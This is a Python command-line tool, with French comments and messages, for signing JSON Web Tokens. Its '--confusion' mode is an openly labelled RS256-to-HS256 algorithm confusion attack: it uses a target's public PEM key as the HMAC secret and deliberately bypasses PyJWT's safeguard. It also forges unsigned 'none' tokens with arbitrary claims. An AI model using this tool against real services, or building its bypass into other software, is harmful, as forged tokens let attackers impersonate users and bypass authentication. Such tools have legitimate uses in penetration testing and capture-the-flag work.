#!/usr/bin/env python3

import argparse
import base64
import hashlib
import hmac as hmac_module
import json
import sys
import time
from pathlib import Path

import jwt


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def load_key_material(path: str, alg: str, confusion: bool) -> bytes | str:

    data = Path(path).read_bytes()

    if confusion:
        return data

    if alg.startswith("HS"):
        try:
            # Retire uniquement les fins de ligne classiques d'un fichier secret.
            return data.decode("utf-8").rstrip("\r\n")
        except UnicodeDecodeError:
            # Secret binaire.
            return data

    # RSA / EC / PSS :
    # PyJWT peut recevoir directement le PEM sous forme de bytes.
    return data


def sign_hmac_raw(header: dict, payload: dict, secret_bytes: bytes, alg: str) -> str:
    

    hash_algs = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }

    if alg not in hash_algs:
        print(f"Erreur: --confusion ne supporte que HS256/HS384/HS512, pas {alg}", file=sys.stderr)
        sys.exit(1)

    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":"), ensure_ascii=False).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode())

    signing_input = f"{header_b64}.{payload_b64}".encode()

    signature = hmac_module.new(secret_bytes, signing_input, hash_algs[alg]).digest()
    signature_b64 = b64url_encode(signature)

    return f"{header_b64}.{payload_b64}.{signature_b64}"


def parse_json_arg(value: str) -> dict:
    

    p = Path(value)

    if p.is_file():
        try:
            return json.loads(p.read_text(encoding="utf-8"))
        except json.JSONDecodeError as e:
            print(
                f"Erreur: JSON invalide dans '{value}': {e}",
                file=sys.stderr
            )
            sys.exit(1)

    try:
        result = json.loads(value)
    except json.JSONDecodeError as e:
        print(
            f"Erreur: JSON invalide: {e}",
            file=sys.stderr
        )
        sys.exit(1)

    if not isinstance(result, dict):
        print(
            "Erreur: le JSON doit contenir un objet.",
            file=sys.stderr
        )
        sys.exit(1)

    return result


def parse_kv_list(pairs: list[str]) -> dict:
    

    result = {}

    for pair in pairs or []:

        if "=" not in pair:
            print(
                f"Erreur: format invalide pour '{pair}', "
                f"attendu key=value",
                file=sys.stderr
            )
            sys.exit(1)

        k, v = pair.split("=", 1)

        if not k:
            print(
                f"Erreur: clé vide dans '{pair}'",
                file=sys.stderr
            )
            sys.exit(1)

        try:
            result[k] = json.loads(v)
        except json.JSONDecodeError:
            result[k] = v

    return result


def main():

    parser = argparse.ArgumentParser(
        description="Signe un JWT avec une clé depuis un fichier."
    )

    parser.add_argument(
        "--key",
        required=True,
        help=(
            "Fichier clé : privée PEM pour RS/ES/PS, "
            "secret brut pour HS, clé publique PEM pour --confusion."
        )
    )

    parser.add_argument(
        "--alg",
        required=True,
        choices=[
            "HS256",
            "HS384",
            "HS512",
            "RS256",
            "RS384",
            "RS512",
            "ES256",
            "ES384",
            "ES512",
            "PS256",
            "PS384",
            "PS512",
            "none",
        ],
        help="Algorithme de signature."
    )

    parser.add_argument(
        "--confusion",
        action="store_true",
        help=(
            "Algorithm confusion attack (RS256->HS256 typiquement). "
            "Utilise les bytes bruts du fichier --key (ex: clé publique PEM "
            "de la cible) comme secret HMAC, en bypassant la vérification "
            "de PyJWT qui refuse normalement les clés PEM comme secret HS*. "
            "Nécessite --alg HS256/HS384/HS512."
        )
    )

    parser.add_argument(
        "--payload",
        required=True,
        help="Fichier JSON du payload ou chaîne JSON inline."
    )

    parser.add_argument(
        "--headers",
        help=(
            "Fichier JSON des headers additionnels "
            "ou chaîne JSON inline."
        )
    )

    parser.add_argument(
        "--header",
        action="append",
        default=[],
        help=(
            "Header additionnel key=value. "
            "Option répétable."
        )
    )

    parser.add_argument(
        "--claim",
        action="append",
        default=[],
        help=(
            "Claim additionnel key=value. "
            "Option répétable."
        )
    )

    parser.add_argument(
        "--exp",
        type=int,
        default=None,
        help="Ajoute exp = maintenant + N secondes."
    )

    parser.add_argument(
        "--auto-iat",
        action="store_true",
        help="Ajoute automatiquement iat = timestamp actuel."
    )

    parser.add_argument(
        "--key-password",
        default=None,
        help="Passphrase si la clé privée PEM est chiffrée."
    )

    args = parser.parse_args()

    if args.confusion and not args.alg.startswith("HS"):
        print("Erreur: --confusion nécessite --alg HS256/HS384/HS512", file=sys.stderr)
        sys.exit(1)

    # ---------------------------------------------------------
    # Payload
    # ---------------------------------------------------------

    payload = parse_json_arg(args.payload)

    # ---------------------------------------------------------
    # Headers
    # ---------------------------------------------------------

    headers = (
        parse_json_arg(args.headers)
        if args.headers
        else {}
    )

    
    default_headers = {"alg": args.alg, "typ": "JWT"}
    default_headers.update(headers)
    headers = default_headers

    
    headers.update(parse_kv_list(args.header))

    # ---------------------------------------------------------
    # Claims
    # ---------------------------------------------------------

    
    payload.update(parse_kv_list(args.claim))

    # ---------------------------------------------------------
    # iat / exp
    # ---------------------------------------------------------

    current_time = int(time.time())

    if args.auto_iat:
        payload["iat"] = current_time

    if args.exp is not None:
        payload["exp"] = current_time + args.exp

   

    if args.confusion:

        secret_bytes = Path(args.key).read_bytes()

        token = sign_hmac_raw(headers, payload, secret_bytes, args.alg)

        print(token)

        print(
            "\n[+] Algorithm confusion (RS256 -> " + args.alg + ")",
            file=sys.stderr
        )
        print(
            "[+] Secret HMAC = bytes bruts de: " + args.key
            + f" ({len(secret_bytes)} bytes)",
            file=sys.stderr
        )
        print(
            "[+] Header : " + json.dumps(headers, ensure_ascii=False),
            file=sys.stderr
        )
        print(
            "[+] Payload: " + json.dumps(payload, ensure_ascii=False),
            file=sys.stderr
        )

        return



    key_material = load_key_material(
        args.key,
        args.alg,
        confusion=False,
    )



    if args.key_password and not args.alg.startswith("HS") and args.alg != "none":

        from cryptography.hazmat.primitives.serialization import (
            load_pem_private_key
        )

        try:
            key_material = load_pem_private_key(
                key_material
                if isinstance(key_material, bytes)
                else key_material.encode(),
                password=args.key_password.encode(),
            )

        except Exception as e:
            print(
                f"Erreur lors du chargement de la clé privée: {e}",
                file=sys.stderr
            )
            sys.exit(1)



    try:

        if args.alg == "none":

            
            token = jwt.encode(
                payload,
                key="",
                algorithm="none",
                headers=headers or None,
            )

        else:

            token = jwt.encode(
                payload,
                key_material,
                algorithm=args.alg,
                headers=headers or None,
            )

    except Exception as e:

        print(
            f"Erreur lors de la signature: {e}",
            file=sys.stderr
        )
        print(
            "\n[!] Astuce: si la clé fournie est une clé publique/privée PEM "
            "et que tu veux forcer HS256 dessus (algorithm confusion attack), "
            "ajoute --confusion.",
            file=sys.stderr
        )
        sys.exit(1)


    print(token)


    try:
        decoded_header = jwt.get_unverified_header(token)

        print(
            "\n[+] Header : "
            + json.dumps(
                decoded_header,
                ensure_ascii=False
            ),
            file=sys.stderr
        )

        print(
            "[+] Payload: "
            + json.dumps(
                payload,
                ensure_ascii=False
            ),
            file=sys.stderr
        )

    except Exception as e:

        print(
            f"[!] Impossible de décoder le JWT pour le debug: {e}",
            file=sys.stderr
        )


if __name__ == "__main__":
    main()
